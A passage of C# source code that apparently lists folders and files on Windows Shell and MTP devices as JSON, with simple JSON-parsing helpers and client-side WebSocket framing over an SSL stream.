                if (norm(p) == normParse || norm(pp) == normParse) { target = it; Log("BuildShell matched at "+i, "MESSAGE"); break; }
            }
            if (target == null) {
                for (int i=0;i<cnt;i++) { object it = ShellCall(items, "Item", new object[]{i}); if (it==null) continue; string t = ShellCall(it, "Name", null) as string; if (t == parse) { target = it; Log("BuildShell matched by name at "+i, "MESSAGE"); break; } }
            }
            if (target == null) { Log("BuildShell target not found for parse=" + parse.Substring(0, Math.Min(200, parse.Length)), "ERROR"); return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}"; }
            string[] segs = rest.Split(new char[]{'/'});
            object curItem = target;
            object curFolder = ShellCall(curItem, "GetFolder", null);
            for (int s = 1; s < segs.Length; s++)
            {
                string want = HexDecode(segs[s]); if (want == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
                if (curFolder == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
                object subItems = ShellCall(curFolder, "Items", null);
                if (subItems == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
                object scObj = ShellCall(subItems, "Count", null);
                if (!(scObj is int)) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
                int sc = (int)scObj;
                bool found = false;
                string normWant = norm(want);
                for (int i = 0; i < sc; i++) {
                    object it = ShellCall(subItems, "Item", new object[]{i});
                    if (it==null) continue;
                    string pn = ShellCall(it, "ParsingName", null) as string ?? "";
                    string pp2 = ShellCall(it, "Path", null) as string ?? "";
                    string nm = ShellCall(it, "Name", null) as string ?? "";
                    if (norm(pn) == normWant || norm(pp2) == normWant || nm == want) { curItem = it; curFolder = ShellCall(it, "GetFolder", null); found = true; break; }
                }
                if (!found) { Log("BuildShell segment not found want=" + want.Substring(0, Math.Min(100, want.Length)), "ERROR"); return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}"; }
            }
            bool isFolder = true;
            try { object fObj = ShellCall(curItem, "IsFolder", null); if (fObj is bool) isFolder = (bool)fObj; } catch { isFolder = curFolder != null; }
            if (!isFolder)
            {
                string name = ShellCall(curItem, "Name", null) as string ?? "file";
                long sz = 0; try { object sObj = ShellCall(curItem, "Size", null); if (sObj != null) long.TryParse(sObj.ToString(), out sz); } catch {}
                string vpath = "shell:" + rest;
                string node = "{\"name\":\"" + EscapeJson(name) + "\",\"relativePath\":\"" + EscapeJson(vpath) + "\",\"isDirectory\":false,\"length\":" + sz + ",\"originalLength\":" + sz + ",\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\"}";
                return "{\"exists\":true,\"currentNode\":" + node + ",\"children\":[],\"totalFileCount\":0}";
            }
            if (curFolder == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
            string curName = ShellCall(curItem, "Name", null) as string ?? "MTP";
            string curVpath = "shell:" + rest;
            string curNode = "{\"name\":\"" + EscapeJson(curName) + "\",\"relativePath\":\"" + EscapeJson(curVpath) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\"}";
            object citems = ShellCall(curFolder, "Items", null);
            if (citems == null) return "{\"exists\":true,\"currentNode\":" + curNode + ",\"children\":[],\"totalFileCount\":0}";
            object tcObj = ShellCall(citems, "Count", null);
            int total = tcObj is int ? (int)tcObj : 0;
            var dirs = new List<object>();
            var files = new List<object>();
            for (int i = 0; i < total; i++)
            {
                try
                {
                    object it = ShellCall(citems, "Item", new object[]{i});
                    if (it==null) continue;
                    object fObj = ShellCall(it, "IsFolder", null);
                    bool f = fObj is bool ? (bool)fObj : true;
                    if (f) dirs.Add(it);
                    else
                    {
                        string nm = ShellCall(it, "Name", null) as string ?? "";
                        if (imageOnly || videoOnly) { bool isImg = IsImage(nm); bool isVid = IsVideo(nm); if (!((imageOnly && isImg) || (videoOnly && isVid))) continue; }
                        files.Add(it);
                    }
                } catch {}
            }
            int totalFileCount = files.Count;
            List<object> paged = files;
            if (fileLimit > 0 || startIndex > 0)
            {
                int from = Math.Max(0, startIndex);
                if (from >= totalFileCount) paged = new List<object>();
                else { int to = fileLimit > 0 ? Math.Min(totalFileCount, from + fileLimit) : totalFileCount; paged = files.GetRange(from, to - from); }
            }
            var sb = new StringBuilder();
            sb.Append("{\"exists\":true,\"currentNode\":" + curNode + ",\"children\":[");
            bool first = true;
            foreach (object d in dirs)
            {
                try
                {
                    string nm = ShellCall(d, "Name", null) as string ?? "dir";
                    string pn = ShellCall(d, "ParsingName", null) as string; if (string.IsNullOrEmpty(pn)) pn = ShellCall(d, "Path", null) as string; if (string.IsNullOrEmpty(pn)) pn = nm;
                    string vp = curVpath + "/" + HexEncode(pn);
                    if (!first) sb.Append(",");
                    sb.Append("{\"name\":\"" + EscapeJson(nm) + "\",\"relativePath\":\"" + EscapeJson(vp) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\"}");
                    first = false;
                } catch {}
            }
            foreach (object f in paged)
            {
                try
                {
                    string nm = ShellCall(f, "Name", null) as string ?? "file";
                    string pn = ShellCall(f, "ParsingName", null) as string; if (string.IsNullOrEmpty(pn)) pn = ShellCall(f, "Path", null) as string; if (string.IsNullOrEmpty(pn)) pn = nm;
                    long sz = 0; try { object sObj = ShellCall(f, "Size", null); if (sObj != null) long.TryParse(sObj.ToString(), out sz); } catch {}
                    string vp = curVpath + "/" + HexEncode(pn);
                    if (!first) sb.Append(",");
                    sb.Append("{\"name\":\"" + EscapeJson(nm) + "\",\"relativePath\":\"" + EscapeJson(vp) + "\",\"isDirectory\":false,\"length\":" + sz + ",\"originalLength\":" + sz + ",\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\"}");
                    first = false;
                } catch {}
            }
            sb.Append("],\"totalFileCount\":" + totalFileCount + "}");
            return sb.ToString();
        } catch (Exception ex) { Log("BuildShellPathInfoJson ex: " + ex.Message + " " + ex.StackTrace, "ERROR"); return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}"; }
    }

    // ---------- JSON extract helpers ----------
    static string ExtractJsonString(string json, string key, int arrIdx = -1)
    {
        try
        {
            int ki = json.IndexOf("\"" + key + "\"");
            if (ki == -1) return "";
            int colon = json.IndexOf(':', ki);
            if (colon == -1) return "";
            int p = colon + 1;
            while (p < json.Length && char.IsWhiteSpace(json[p])) p++;
            if (arrIdx >= 0)
            {
                int br = json.IndexOf('[', p);
                if (br == -1) return "";
                p = br + 1;
                for (int i = 0; i < arrIdx; i++)
                {
                    bool inStr = false; int depth = 0;
                    while (p < json.Length)
                    {
                        char c = json[p];
                        if (c == '"' && (p == 0 || json[p - 1] != '\\')) inStr = !inStr;
                        if (!inStr)
                        {
                            if (c == '[') depth++;
                            else if (c == ']') { if (depth == 0) break; depth--; }
                            else if (c == ',' && depth == 0) { p++; break; }
                        }
                        p++;
                    }
                }
                while (p < json.Length && char.IsWhiteSpace(json[p])) p++;
                if (p >= json.Length) return "";
                if (json[p] == '"')
                {
                    int s = p + 1; int e = json.IndexOf('"', s);
                    while (e != -1 && json[e - 1] == '\\') e = json.IndexOf('"', e + 1);
                    if (e == -1) return "";
                    // unescape simple
                    string raw = json.Substring(s, e - s);
                    return raw.Replace("\\\"", "\"").Replace("\\\\", "\\").Replace("\\r", "\r").Replace("\\n", "\n");
                }
                else if (p < json.Length && json.Substring(p).StartsWith("true")) return "true";
                else if (p < json.Length && json.Substring(p).StartsWith("false")) return "false";
                else if (p < json.Length && json.Substring(p).StartsWith("null")) return "";
                else
                {
                    int e = p;
                    while (e < json.Length && json[e] != ',' && json[e] != ']') e++;
                    return json.Substring(p, e - p).Trim().Trim(new char[]{'"'});
                }
            }
            else
            {
                if (p >= json.Length) return "";
                if (json[p] == '"')
                {
                    int s = p + 1; int e = json.IndexOf('"', s);
                    while (e != -1 && json[e - 1] == '\\') e = json.IndexOf('"', e + 1);
                    if (e == -1) return "";
                    string raw = json.Substring(s, e - s);
                    return raw.Replace("\\\"", "\"").Replace("\\\\", "\\");
                }
                else
                {
                    int e = p;
                    while (e < json.Length && json[e] != ',' && json[e] != '}') e++;
                    return json.Substring(p, e - p).Trim().Trim(new char[]{'"'});
                }
            }
        } catch { return ""; }
    }
    static bool ExtractJsonBool(string json, string key, int idx) { string v = ExtractJsonString(json, key, idx); return v == "true" || v == "True" || v == "1"; }
    static int ExtractJsonInt(string json, string key, int idx) { string v = ExtractJsonString(json, key, idx); int r = 0; int.TryParse(v, out r); return r; }
    static long ExtractJsonLong(string json, string key, int idx) { string v = ExtractJsonString(json, key, idx); long r = 0; long.TryParse(v, out r); return r; }

    // ---------- WebSocket framing ----------
    static async Task SendWsText(SslStream s, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;
        byte[] mask = new byte[4];
        new Random().NextBytes(mask);
        byte b0 = 0x81;
        var header = new List<byte>();
        header.Add(b0);
        if (len <= 125) header.Add((byte)(0x80 | len));
        else if (len <= 65535) { header.Add((byte)(0x80 | 126)); header.Add((byte)((len >> 8) & 0xFF)); header.Add((byte)(len & 0xFF)); }
        else { header.Add((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) header.Add((byte)(((long)len >> (i * 8)) & 0xFF)); }
        header.AddRange(mask);
        byte[] masked = new byte[len];
        for (int i = 0; i < len; i++) masked[i] = (byte)(payload[i] ^ mask[i % 4]);
        lock (s) { s.Write(header.ToArray(), 0, header.Count); s.Write(masked, 0, masked.Length); s.Flush(); }
        // also log send for debug
        // Log("WS send len=" + len + " preview=" + text.Substring(0, Math.Min(200, text.Length)), "MESSAGE");
    }

    static async Task<string> ReadWsText(SslStream input)
    {
        try
        {
            int b0 = input.ReadByte(); if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            if (opcode == 0x8) return null;
            int b1 = input.ReadByte(); if (b1 == -1) return null;
            bool masked = (b1 & 0x80) != 0;
            long len = b1 & 0x7F;
            if (len == 126)
            {
                int b2 = input.ReadByte(), b3 = input.ReadByte();
                len = (b2 << 8) | b3;
            }
            else if (len == 127)
            {
                len = 0;
                for (int i = 0; i < 8; i++) { int b = input.ReadByte(); len = (len << 8) | (uint)b; }
            }
            byte[] mask = null;
            if (masked) { mask = new byte[4]; for (int i = 0; i < 4; i++) mask[i] = (byte)input.ReadByte(); }
            byte[] payload = new byte[len];
            int read = 0;
            while (read < len)
            {
                int r = await input.ReadAsync(payload, read, (int)(len - read));
                if (r <= 0) return null;
                read += r;
            }
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            return Encoding.UTF8.GetString(payload);
        } catch { return null; }
    }
}
